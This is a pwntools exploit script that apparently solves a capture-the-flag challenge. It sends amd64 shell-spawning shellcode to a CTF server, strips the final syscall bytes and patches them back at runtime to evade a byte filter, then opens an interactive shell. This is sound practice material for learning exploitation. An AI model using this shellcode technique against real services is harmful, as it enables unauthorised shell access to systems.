from pwn import *

context.arch = 'amd64'
p = remote('ctf.adl.tw', 10003)
sh_asm = shellcraft.sh()
shellcode = asm(sh_asm)
shellcode=shellcode[:-2]

prefix = bytearray(b"A" * 56)
for i in range(10):
    prefix[i * 6] = 0x0c
    prefix[i * 6 + 1] = 0x87
prefix[2:4] = b"\xeb\x34"   
prefix_bytes = bytes(prefix)
mycode ="""mov bl, 0x0d
add bl, 0x02
mov byte ptr [rbp - 0x1A], bl
mov bl, 0x04
add bl, 0x01
mov byte ptr [rbp - 0x19], bl
"""
sendmesg=prefix_bytes+shellcode+asm(mycode)
code_len=len(sendmesg)
padding_len = 120 - code_len
padding = b"A" * padding_len
sendmesg+=padding
p.sendline(sendmesg)
p.interactive()
